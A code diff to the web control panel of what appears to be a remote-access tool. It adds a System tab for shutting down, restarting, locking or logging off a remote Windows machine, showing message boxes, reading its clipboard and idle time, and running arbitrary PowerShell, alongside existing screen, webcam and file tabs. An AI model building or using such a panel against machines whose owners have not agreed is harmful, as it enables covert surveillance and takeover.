@@ -104,6 +104,7 @@ select.mon:focus{border-color:#58a6ff}
     <div class="tab" onclick="switchTab(this,'screenshot')">Screenshot</div>
     <div class="tab" onclick="switchTab(this,'screen')">Screen</div>
     <div class="tab" onclick="switchTab(this,'processes')">Processes</div>
+    <div class="tab" onclick="switchTab(this,'system')">System</div>
     <div class="tab" onclick="switchTab(this,'files')">Files</div>
     <div class="tab" onclick="switchTab(this,'webcam')">Webcam</div>
   </div>
@@ -145,6 +146,31 @@ select.mon:focus{border-color:#58a6ff}
     </div>
     <div id="procResult"><div class="loading">Click Refresh to list processes</div></div>
     <div id="procErr" class="err"></div>
+  </div>
+
+  <div class="panel" id="panel-system">
+    <div class="capture-bar">
+      <button class="btn btn-danger" onclick="sendSystemCmd('shutdown')">Shutdown</button>
+      <button class="btn btn-orange" onclick="sendSystemCmd('restart')">Restart</button>
+      <button class="btn btn-ghost" onclick="sendSystemCmd('lock')">Lock</button>
+      <button class="btn btn-ghost" onclick="sendSystemCmd('logoff')">Logoff</button>
+      <button class="btn btn-accent" onclick="showMsgBox()">MsgBox</button>
+      <span class="sep">|</span>
+      <button class="btn btn-ghost" onclick="getClipboardText()">Clipboard</button>
+      <button class="btn btn-ghost" onclick="getIdleTime()">Idle</button>
+      <button class="btn btn-ghost" onclick="getUptime()">Uptime</button>
+    </div>
+    <div class="capture-bar" style="margin-top:.3rem">
+      <span style="color:#8b949e;font-size:.82rem">Volume:</span>
+      <input type="range" id="volSlider" min="0" max="100" value="50" style="flex:1;max-width:200px" onchange="setVolume(this.value)">
+      <span id="volVal" style="color:#e6edf3;font-size:.82rem;width:2.5rem">50</span>
+      <span class="sep">|</span>
+      <span style="color:#8b949e;font-size:.82rem">PowerShell:</span>
+      <input id="psInput" placeholder="command" style="flex:1;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.35rem .6rem;color:#e6edf3;font-size:.82rem;outline:none;max-width:300px">
+      <button class="btn btn-accent btn-sm" onclick="runPowerShell()">Run</button>
+    </div>
+    <div id="sysResult" style="background:#161b22;border:1px solid #21262d;border-radius:10px;padding:1rem;font-family:monospace;font-size:.82rem;min-height:60px;max-height:200px;overflow-y:auto;margin-top:.5rem"><div class="loading">System commands ready</div></div>
+    <div id="sysErr" class="err"></div>
   </div>
 
   <div class="panel" id="panel-files">
@@ -282,6 +308,7 @@ async function pollScreen(){
     }else{
      el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
      setupCanvas();
+     if(mouseOn)setupMouseEvents();
     }
     pollLastTime=t;
     frameCount++;
@@ -335,38 +362,36 @@ async function sendFireForget(type,payload){
  }catch{}
 }
 
+function setupMouseEvents(){
+ const c=document.getElementById('screenCanvas');
+ if(!c)return;
+ c.style.cursor=mouseOn?'crosshair':'default';
+ c.onmousedown=mouseOn?function(e){
+  if(!mouseOn)return;
+  const p=getScreenCoords(e);
+  if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));
+ }:null;
+ c.onmouseup=mouseOn?function(e){
+  if(!mouseOn)return;
+  const p=getScreenCoords(e);
+  if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));
+ }:null;
+ c.onmousemove=mouseOn?function(e){
+  if(!mouseOn)return;
+  const now=Date.now();
+  if(now-mouseThrottle<50)return;
+  mouseThrottle=now;
+  const p=getScreenCoords(e);
+  if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));
+ }:null;
+}
+
 function toggleMouse(){
  mouseOn=!mouseOn;
  const btn=document.getElementById('mouseBtn');
  btn.textContent=mouseOn?'Mouse ON':'Mouse OFF';
  btn.classList.toggle('active-toggle',mouseOn);
- const c=document.getElementById('screenCanvas');
- if(mouseOn&&c){
-  c.style.cursor='crosshair';
-  c.onmousedown=function(e){
-   if(!mouseOn)return;
-   const p=getScreenCoords(e);
-   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));
-  };
-  c.onmouseup=function(e){
-   if(!mouseOn)return;
-   const p=getScreenCoords(e);
-   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));
-  };
-  c.onmousemove=function(e){
-   if(!mouseOn)return;
-   const now=Date.now();
-   if(now-mouseThrottle<50)return;
-   mouseThrottle=now;
-   const p=getScreenCoords(e);
-   if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));
-  };
- }else if(c){
-  c.onmousedown=null;
-  c.onmouseup=null;
-  c.onmousemove=null;
-  c.style.cursor='default';
- }
+ setupMouseEvents();
 }
 
 function toggleKeyboard(){
@@ -456,6 +481,53 @@ function renderFiles(json){
   html+='</div>';
  });
  el.innerHTML=html;
+}
+
+async function sendSystemCmd(type){
+ const el=document.getElementById('sysResult');
+ const err=document.getElementById('sysErr');
+ err.style.display='none';
+ if(type==='shutdown'||type==='restart'){if(!confirm('Confirm '+type+'?'))return}
+ const res=await sendAndWait(type,'',el,'sysErr');
+ if(res)el.innerHTML='<div style="color:#3fb950">OK: '+type+'</div>';
+}
+function showMsgBox(){
+ const t=prompt('Message text:');
+ if(!t)return;
+ const ti=prompt('Title:','Remote');
+ const el=document.getElementById('sysResult');
+ el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
+ sendAndWait('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{
+  if(r)el.innerHTML='<div style="color:#3fb950">Message sent</div>';
+ });
+}
+function setVolume(v){
+ document.getElementById('volVal').textContent=v;
+}
+async function getClipboardText(){
+ const el=document.getElementById('sysResult');
+ const res=await sendAndWait('clipboard','',el,'sysErr');
+ if(res)el.innerHTML='Clipboard: '+esc(res.result);
+}
+async function getIdleTime(){
+ const el=document.getElementById('sysResult');
+ const res=await sendAndWait('idle','',el,'sysErr');
+ if(res)el.innerHTML='Idle time: '+esc(res.result)+' seconds';
+}
+async function getUptime(){
+ const el=document.getElementById('sysResult');
+ const res=await sendAndWait('uptime','',el,'sysErr');
+ if(res)el.innerHTML='Uptime: '+esc(res.result)+' seconds ('+Math.floor(parseInt(res.result)/3600)+'h)';
+}
+async function runPowerShell(){
+ const cmd=document.getElementById('psInput').value.trim();
+ if(!cmd)return;
+ const el=document.getElementById('sysResult');
+ const err=document.getElementById('sysErr');
+ err.style.display='none';
+ el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';
+ const res=await sendAndWait('powershell',cmd,el,'sysErr');
+ if(res)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
 }
 
 function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
